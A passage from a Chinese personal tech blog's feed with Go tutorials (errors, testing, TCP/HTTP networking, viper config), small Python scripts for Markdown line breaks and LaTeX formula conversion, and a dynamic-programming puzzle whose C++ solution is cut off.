<code>Rectangle</code> 类型的实例：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">rect := Rectangle&#123;Length: <span class="number">10</span>, Width: <span class="number">5</span>&#125;</span><br><span class="line">area := rect.Area() <span class="comment">// 调用 Area 方法</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>rect.Area()</code> 调用会将 <code>rect</code> 作为接收者传递给 <code>Area</code> 方法。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>方法接收者使得 Go 语言能够在结构体类型上定义方法，从而实现面向对象编程的一些特性。这种方式提供了数据和操作这些数据的方法之间的关联，类似于其他语言中的类方法，但在 Go 中以一种更简单和更灵活的方式实现。</p><p>好的，我们来深入理解 Go 语言中的 <code>error</code> 接口、单元测试和基准测试。这三个概念对于编写可靠和高性能的 Go 程序至关重要。</p><h1 id="错误处理和测试"><a href="#错误处理和测试" class="headerlink" title="错误处理和测试"></a>错误处理和测试</h1><h3 id="深入理解-error-接口"><a href="#深入理解-error-接口" class="headerlink" title="深入理解 error 接口"></a>深入理解 <code>error</code> 接口</h3><p>在 Go 中，<code>error</code> 是一个内置的接口，用于表示错误条件，具有以下定义：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>任何具有 <code>Error() string</code> 方法的类型都自动实现了 <code>error</code> 接口。这意味着你可以创建自定义错误类型。</p><h4 id="自定义错误"><a href="#自定义错误" class="headerlink" title="自定义错误"></a>自定义错误</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyError <span class="keyword">struct</span> &#123;</span><br><span class="line">    Msg <span class="type">string</span></span><br><span class="line">    Code <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *MyError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;error: %s, code: %d&quot;</span>, e.Msg, e.Code)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="comment">// 一些逻辑...</span></span><br><span class="line">    <span class="keyword">return</span> &amp;MyError&#123;<span class="string">&quot;Something went wrong&quot;</span>, <span class="number">404</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们定义了一个自定义错误类型 <code>MyError</code>，并实现了 <code>Error()</code> 方法。在 <code>doSomething</code> 函数中，我们返回了这个自定义错误。</p><h3 id="编写单元测试（testing-包）"><a href="#编写单元测试（testing-包）" class="headerlink" title="编写单元测试（testing 包）"></a>编写单元测试（testing 包）</h3><p>Go 语言的 <code>testing</code> 包提供了编写单元测试的功能。单元测试是验证代码行为的一种方法。</p><h4 id="基本单元测试"><a href="#基本单元测试" class="headerlink" title="基本单元测试"></a>基本单元测试</h4><p>单元测试通常写在与源代码同一目录下的 <code>_test.go</code> 文件中。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 假设有以下函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单元测试</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAdd</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    result := Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> result != <span class="number">3</span> &#123;</span><br><span class="line">        t.Errorf(<span class="string">&quot;Add(1, 2) = %d; want 3&quot;</span>, result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>go test</code> 命令运行测试。</p><h3 id="基准测试（Benchmark）"><a href="#基准测试（Benchmark）" class="headerlink" title="基准测试（Benchmark）"></a>基准测试（Benchmark）</h3><p>基准测试用于测试代码的性能。在 Go 中，基准测试也是用 <code>testing</code> 包来编写的。</p><h4 id="基准测试示例"><a href="#基准测试示例" class="headerlink" title="基准测试示例"></a>基准测试示例</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkAdd</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>b.N</code> 是 Go 测试框架提供的，基准测试会运行多次以获取更准确的结果。</li><li>使用 <code>go test -bench=.</code> 命令运行基准测试。</li></ul><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>理解 <code>error</code> 接口</strong>：能够有效地处理错误情况，是写出健壮 Go 程序的关键。</li><li><strong>编写单元测试</strong>：是确保代码正确性的重要手段。</li><li><strong>进行基准测试</strong>：帮助你了解代码的性能特征，对于优化和保证代码性能非常重要。</li></ul><p>通过掌握这些概念和技巧，你可以写出更可靠、更高效的 Go 程序。💡🧪💻🚀</p><p>Go 语言在网络编程方面表现非常出色，提供了强大的库来支持各种网络操作。让我们来探索 Go 中的网络编程基础。</p><h1 id="Go-网络编程概览"><a href="#Go-网络编程概览" class="headerlink" title="Go 网络编程概览"></a>Go 网络编程概览</h1><p>Go 的 <code>net</code> 包提供了丰富的网络操作接口。它支持 TCP、UDP、IP 等多种网络协议，并且能够轻松地实现客户端和服务器应用程序。</p><h3 id="TCP-编程"><a href="#TCP-编程" class="headerlink" title="TCP 编程"></a>TCP 编程</h3><p>TCP（传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。</p><h4 id="TCP-服务器"><a href="#TCP-服务器" class="headerlink" title="TCP 服务器"></a>TCP 服务器</h4><p>创建一个 TCP 服务器主要包括以下步骤：</p><ol><li>监听端口。</li><li>接受连接请求。</li><li>读取和写入数据。</li></ol><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 监听 TCP 端口</span></span><br><span class="line">    ln, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> ln.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 接受连接</span></span><br><span class="line">        conn, err := ln.Accept()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理连接</span></span><br><span class="line">        <span class="keyword">go</span> handleConnection(conn)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    reader := bufio.NewReader(conn)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 读取数据</span></span><br><span class="line">        msg, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Print(<span class="string">&quot;Message Received:&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送响应</span></span><br><span class="line">        conn.Write([]<span class="type">byte</span>(<span class="string">&quot;Message received.\n&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TCP-客户端"><a href="#TCP-客户端" class="headerlink" title="TCP 客户端"></a>TCP 客户端</h4><p>创建一个 TCP 客户端通常包括以下步骤：</p><ol><li>连接到服务器。</li><li>读取和写入数据。</li></ol><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;localhost:8080&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    fmt.Fprintln(conn, <span class="string">&quot;Hello, Server!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收响应</span></span><br><span class="line">    response, err := bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Print(<span class="string">&quot;Server Response:&quot;</span>, response)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UDP-编程"><a href="#UDP-编程" class="headerlink" title="UDP 编程"></a>UDP 编程</h3><p>UDP（用户数据报协议）是一种无连接的网络协议，提供了快速但不可靠的传输服务。</p><h4 id="UDP-服务器"><a href="#UDP-服务器" class="headerlink" title="UDP 服务器"></a>UDP 服务器</h4><p>创建一个 UDP 服务器的步骤：</p><ol><li>监听 UDP 端口。</li><li>读取和写入数据。</li></ol><h4 id="UDP-客户端"><a href="#UDP-客户端" class="headerlink" title="UDP 客户端"></a>UDP 客户端</h4><p>创建一个 UDP 客户端的步骤：</p><ol><li>发送数据到服务器。</li><li>接收服务器的响应。</li></ol><h3 id="HTTP-编程"><a href="#HTTP-编程" class="headerlink" title="HTTP 编程"></a>HTTP 编程</h3><p>Go 的 <code>net/http</code> 包提供了 HTTP 客户端和服务器的实现。</p><h4 id="HTTP-服务器"><a href="#HTTP-服务器" class="headerlink" title="HTTP 服务器"></a>HTTP 服务器</h4><p>创建一个简单的 HTTP 服务器：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;Hello, you&#x27;ve requested: %s\n&quot;</span>, r.URL.Path)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HTTP-客户端"><a href="#HTTP-客户端" class="headerlink" title="HTTP 客户端"></a>HTTP 客户端</h4><p>使用 <code>net/http</code> 包创建 HTTP 客户端来发送请求：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;http://example.com/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>Go 语言中的网络编程非常强大和灵活，无论是低级的 TCP&#x2F;UDP 编程，还是更高级的 HTTP</p><p> 应用，Go 都提供了丰富的工具和库来实现它们。通过实践这些基础知识，你可以构建各种网络应用和服务。💻🌐🚀</p><h1 id="常用设计模式"><a href="#常用设计模式" class="headerlink" title="常用设计模式"></a>常用设计模式</h1><p>在 Go 中，有一些常用的设计模式非常适合处理特定的编程问题。</p><ol><li><strong>单例模式</strong><ul><li>确保一个类只有一个实例，并提供全局访问点。</li></ul></li><li><strong>工厂模式</strong><ul><li>用一个工厂类创建对象，而不是在客户端代码中直接 new 对象。</li></ul></li><li><strong>策略模式</strong><ul><li>定义一系列算法，把它们一个个封装起来，并使它们可以相互替换。</li></ul></li><li><strong>装饰器模式</strong><ul><li>动态地给一个对象添加一些额外的职责，比直接修改对象更灵活。</li></ul></li><li><strong>观察者模式</strong><ul><li>当一个对象状态发生改变时，所有依赖于它的对象都将得到通知。</li></ul></li><li><strong>适配器模式</strong><ul><li>将一个类的接口转换成客户希望的另外一个接口。</li></ul></li></ol><h1 id="配置管理——viper"><a href="#配置管理——viper" class="headerlink" title="配置管理——viper"></a>配置管理——viper</h1><p><code>viper</code> 是 Go 语言中非常流行的配置管理库，它被广泛用于处理应用程序的配置需求。<code>viper</code> 强大在于它的灵活性和易用性，支持多种格式的配置文件（JSON、TOML、YAML、HCL 等），并且能够从环境变量、命令行参数、远程配置系统（如 etcd 或 Consul）等多种来源读取配置。</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ol><li><strong>设置默认值</strong>：为不同的配置键设置默认值。</li><li><strong>读取配置</strong>：从文件、环境变量、远程系统等读取配置。</li><li><strong>实时重载</strong>：支持实时监控配置文件的更改并重新加载配置。</li><li><strong>类型安全获取值</strong>：提供方法安全地获取配置值的不同类型（例如 <code>GetString</code>, <code>GetInt</code> 等）。</li></ol><h3 id="基本用法-4"><a href="#基本用法-4" class="headerlink" title="基本用法"></a>基本用法</h3><ol><li><p><strong>安装</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go get github.com/spf13/viper</span><br></pre></td></tr></table></figure></li><li><p><strong>基本配置读取</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 设置配置文件名和路径</span></span><br><span class="line">    viper.SetConfigName(<span class="string">&quot;config&quot;</span>) <span class="comment">// 配置文件名称(无扩展名)</span></span><br><span class="line">    viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)   <span class="comment">// 如果配置文件的名称中没有扩展名，则需要配置此项</span></span><br><span class="line">    viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)      <span class="comment">// 查找配置文件所在的路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取配置文件</span></span><br><span class="line">    err := viper.ReadInConfig()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Error reading config file, %s&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取配置信息</span></span><br><span class="line">    host := viper.GetString(<span class="string">&quot;server.host&quot;</span>)</span><br><span class="line">    port := viper.GetInt(<span class="string">&quot;server.port&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Host: %s, Port: %d\n&quot;</span>, host, port)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里假设有一个名为 <code>config.yaml</code> 的配置文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure></li><li><p><strong>从环境变量读取配置</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">viper.AutomaticEnv() <span class="comment">// 自动读取环境变量</span></span><br></pre></td></tr></table></figure></li><li><p><strong>设置默认值</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">viper.SetDefault(<span class="string">&quot;server.port&quot;</span>, <span class="number">8080</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>实时重载配置文件</strong></p><ul><li><code>viper</code> 支持实时监控配置文件的更改，并可以设置回调函数来处理更改事件。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">viper.WatchConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(e fsnotify.Event)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Config file changed:&quot;</span>, e.Name)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>命令行参数</strong></p><ul><li><code>viper</code> 可以和 <code>cobra</code> 库（同样由 spf13 提供）结合使用，以支持从命令行参数读取配置。</li></ul></li></ol><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p><code>viper</code> 为 Go 应用程序提供了一种灵活且强大的方式来处理配置。它的多来源读取能力、实时重载功能以及与其他库的良好集成，使得 <code>viper</code> 成为 Go 开发者处理配置的首选库。通过熟练使用 <code>viper</code>，你可以更容易地管理和修改应用程序的行为，而不需要重新编译代码。💻🔧📂🚀</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/go/">go</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/go%E7%9A%84%E5%85%A5%E9%97%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>markdown空行添加br的脚本</title>
      <link>https://cjliblog.top/2023/12/13/markdown%E7%A9%BA%E8%A1%8C%E6%B7%BB%E5%8A%A0br%E8%84%9A%E6%9C%AC/</link>
      <guid>https://cjliblog.top/2023/12/13/markdown%E7%A9%BA%E8%A1%8C%E6%B7%BB%E5%8A%A0br%E8%84%9A%E6%9C%AC/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<br><p>写博客的时候遇到的问题，因为md在web上空行是自动删除的，除非使用<code>&lt;/br&gt;</code>，因此编写一下python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_br_to_empty_lines</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> line.strip() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                file.write(<span class="string">&#x27;&lt;/br&gt;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file.write(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">input_md_file = <span class="string">&#x27;s:/11953/Desk/learning_doc.md&#x27;</span>  <span class="comment"># 替换成你的Markdown文件名</span></span><br><span class="line">output_md_file = <span class="string">&#x27;s:/11953/Desk/233.md&#x27;</span>  <span class="comment"># 替换成输出文件名</span></span><br><span class="line">add_br_to_empty_lines(input_md_file, output_md_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E6%8A%80%E6%9C%AF%E8%B4%B4/">技术贴</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/markdown%E7%A9%BA%E8%A1%8C%E6%B7%BB%E5%8A%A0br%E8%84%9A%E6%9C%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>制作一个latex-markdown数学公式转化器</title>
      <link>https://cjliblog.top/2023/12/11/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAlatex-markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%BD%AC%E5%8C%96%E5%99%A8/</link>
      <guid>https://cjliblog.top/2023/12/11/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAlatex-markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%BD%AC%E5%8C%96%E5%99%A8/</guid>
      <pubDate>Sun, 10 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>在使用GPT进行输出数学公式的时候会有一个难受的地方，就是它是latex原生代码，导致粘贴到markdown的时候会显示一堆括号并且删起来比较麻烦。而md的公式标记方法是用<code>$$</code>。因此，开发一个小脚本用于简便转化。。</p><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_latex_in_markdown</span>(<span class="params">file_path, output_path</span>):</span><br><span class="line">    <span class="comment"># 正则表达式匹配 LaTeX 代码</span></span><br><span class="line">    regex1 = <span class="string">r&quot;\\\[(.*?)\\\]&quot;</span></span><br><span class="line">    regex2 = <span class="string">r&quot;\\\((.*?)\\\)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 替换 LaTeX 代码</span></span><br><span class="line">    formatted_content = re.sub(regex1, <span class="string">r&quot;$\1$&quot;</span>, content)</span><br><span class="line">    formatted_content = re.sub(regex2, <span class="string">r&quot;$\1$&quot;</span>, formatted_content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入输出文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(formatted_content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">input_file_path = <span class="string">&#x27;input.txt&#x27;</span>  <span class="comment"># 这里替换成你的输入文件路径</span></span><br><span class="line">output_file_path = <span class="string">&#x27;output.txt&#x27;</span>  <span class="comment"># 这里替换成你想要的输出文件路径</span></span><br><span class="line"></span><br><span class="line">format_latex_in_markdown(input_file_path, output_file_path)</span><br></pre></td></tr></table></figure><p>只需要创建这两个文件，然后把想要转化的放在input.txt里，就可以在output.txt中获得输出了。使用起来蛮方便的。</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E6%8A%80%E6%9C%AF%E8%B4%B4/">技术贴</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/11/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAlatex-markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%BD%AC%E5%8C%96%E5%99%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>动态规划题——fate</title>
      <link>https://cjliblog.top/2023/12/11/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94fate/</link>
      <guid>https://cjliblog.top/2023/12/11/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94fate/</guid>
      <pubDate>Sun, 10 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>最近xhd正在玩一款叫做FATE的游戏，为了得到极品装备，xhd在不停的杀怪做任务。久而久之xhd开始对杀怪产生的厌恶感，但又不得不通过杀怪来升完这最后一级。现在的问题是，xhd升掉最后一级还需n的经验值，xhd还留有m的忍耐度，每杀一个怪xhd会得到相应的经验，并减掉相应的忍耐度。当忍耐度降到0或者0以下时，xhd就不会玩这游戏。xhd还说了他最多只杀s只怪。请问他能升掉这最后一级吗？</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>输入数据有多组，对于每组数据第一行输入n，m，k，s(0 &lt; n,m,k,s &lt; 100)四个正整数。分别表示还需的经验值，保留的忍耐度，怪的种数和最多的杀怪数。接下来输入k行数据。每行数据输入两个正整数a，b(0 &lt; a,b &lt; 20)；分别表示杀掉一只这种怪xhd会得到的经验值和会减掉的忍耐度。(每种怪都有无数个)</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>输出升完这级还能保留的最大忍耐度，如果无法升完这级输出-1。</p><h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 10 1 10</span><br><span class="line">1 1</span><br><span class="line">10 10 1 9</span><br><span class="line">1 1</span><br><span class="line">9 10 2 10</span><br><span class="line">1 1</span><br><span class="line">2 2</span><br></pre></td></tr></table></figure><h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">-1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="我的题解："><a href="#我的题解：" class="headerlink" title="我的题解："></a>我的题解：</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> k, <span class="type">int</span> s, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; monsters)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//分别表示还需的经验值n，保留的忍耐度m，怪的种数k和最多的杀怪数s</span></span><br><span class="line">    <span class="function">vector <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, vector(s + <span class="number">1</span>, <span class="number">-1000</span>))</span></span>;<span class="comment">//还需的经验值，杀怪数，剩余的忍耐度，-1000代表不存在</span></span><br><span class="line">    dp[n][<span class="number">0</span>] = m;<span class="comment">//刚开始，还差n经验，忍耐度为m</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;<span 